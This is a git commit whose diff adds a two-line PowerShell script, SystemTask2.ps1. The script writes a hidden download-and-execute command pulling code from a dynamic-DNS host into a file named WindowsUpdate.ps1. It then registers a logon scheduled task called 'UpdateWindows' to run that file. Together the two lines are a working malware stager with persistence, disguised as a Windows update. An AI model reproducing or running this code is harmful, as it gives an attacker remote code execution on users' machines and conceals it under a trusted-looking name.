1c80d6ae11e54cf213c9c1a3664fd191e9dd9c88
Gh0st1nTh3Sh3ll1 <Gh0st1nTh3Sh3llUIT@gmail.com>
2017-03-20 21:23:21 +0700

    Update and rename SystemTask.ps1 to SystemTask2.ps1

---
+++ SystemTask2.ps1
@@ -0,0 +1,2 @@
+powershell echo "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://gh0st1nth3sh3ll.hopto.org:80/a'))" > C:\Users\$env:USERNAME\AppData\WindowsUpdate.ps1
+powershell schtasks.exe /create /sc ONLOGON /tn UpdateWindows /tr C:\Users\$env:USERNAME\AppData\WindowsUpdate.ps1
